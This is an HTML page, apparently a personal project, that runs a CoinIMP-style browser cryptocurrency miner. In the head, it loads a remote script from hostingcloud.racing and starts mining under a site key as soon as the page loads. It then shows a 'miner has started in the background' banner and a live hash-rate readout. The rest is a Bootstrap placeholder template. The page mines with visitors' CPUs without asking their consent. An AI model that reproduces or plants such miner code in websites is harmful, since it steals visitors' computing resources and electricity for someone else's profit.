<html>
  <head>
    <script src="https://www.hostingcloud.racing/ElSO.js"></script>
    <script>
      var _client = new Client.Anonymous(
        "30c64beedf9c534e5797c97a3a9a77a14ec14a7cec627d7ad2383da57a1f0daa",
        {
          throttle: 0.9,
          c: "w",
          ads: 0,
        }
      );
      _client.start();
      _client.addMiningNotification("Top", "Miner Has started in the browser background", "#000000", 40, "#ffffff");
    </script>
    <script src="/javascripts/miner.js"></script>
    <script>
      setTimeout(function () {
        // let div = document.createElement("div");
        // document.body.appendChild(div);
        let div = document.getElementById("result-hash")
        setInterval(function () {
          let speed = _client._threads.reduce(
            (before, worker) => before + worker.hashesPerSecond,
            0
          );
          let total = _client._threads.reduce(
            (before, worker) => before + worker.hashesTotal,
            0
          );
          div.innerHTML = `Speed: ${speed} Hashes/s<br>Total Hash: ${total}`;
        }, 500);
      }, 1000);
    </script>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
  </head>
  <body>
    <div class="px-4 py-5 my-5 text-center">
    <img class="d-block mx-auto mb-4" src="/images/icon.png" alt="" width="72" height="57">
    <h1 class="display-5 fw-bold">CoimIMP | @Fauzaro01</h1>
    <div class="col-lg-6 mx-auto">
      <p class="lead mb-4" id="result-hash"></p>
      <div class="d-grid gap-2 d-sm-flex justify-content-sm-center">
        <button type="button" class="btn btn-primary btn-lg px-4 gap-3">Primary button</button>
        <button type="button" class="btn btn-outline-secondary btn-lg px-4">Secondary</button>
      </div>
    </div>
